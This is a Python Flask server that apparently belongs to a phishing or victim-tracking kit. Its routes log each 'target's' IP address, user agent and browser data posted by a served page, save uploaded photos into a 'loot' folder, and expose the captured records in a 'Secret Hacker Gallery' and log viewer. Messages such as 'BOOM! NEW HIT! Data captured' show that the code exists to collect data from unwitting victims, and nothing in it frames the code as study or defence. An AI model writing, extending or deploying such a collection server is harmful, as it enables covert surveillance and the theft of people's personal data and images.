from flask import Flask, request, render_template, send_from_directory
import datetime
import json
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)

LOG_FILE = 'target_logs.txt'
UPLOAD_FOLDER = 'loot'

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_data():
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = request.json
    
    log_entry = {
        "timestamp": str(datetime.datetime.now()),
        "ip": ip_address,
        "user_agent": request.headers.get('User-Agent'),
        "browser_data": data
    }
    
    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(log_entry, indent=4) + "\n" + "-"*50 + "\n")
        
    print(f"\n[+] BOOM! NEW HIT! Data captured from IP: {ip_address}")
    return "OK", 200

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'photo' not in request.files:
        return "No file part", 400
    file = request.files['photo']
    if file.filename == '':
        return "No selected file", 400
    if file:
        filename = secure_filename(file.filename)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_")
        save_path = os.path.join(app.config['UPLOAD_FOLDER'], timestamp + filename)
        file.save(save_path)
        print(f"\n[+] BOOM! PHOTO CAPTURED! Saved to: {save_path}\n")
        return "File uploaded successfully", 200

@app.route('/hacker_logs')
def view_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            content = f.read()
        return f"<pre>{content}</pre>"
    return "No targets captured yet."

@app.route('/hacker_gallery')
def view_gallery():
    images = []
    if os.path.exists(UPLOAD_FOLDER):
        images = os.listdir(UPLOAD_FOLDER)
    
    html = "<h2>Secret Hacker Gallery 😈</h2>"
    if not images:
        html += "<p>No photos captured yet. Wait for target to upload!</p>"
    else:
        for img in images:
            html += f'<div style="margin-bottom: 20px;"><p>{img}</p><img src="/loot/{img}" style="max-width: 400px; border: 2px solid #ff3f6c; border-radius: 8px;"></div>'
    return html

@app.route('/loot/<filename>')
def serve_loot(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
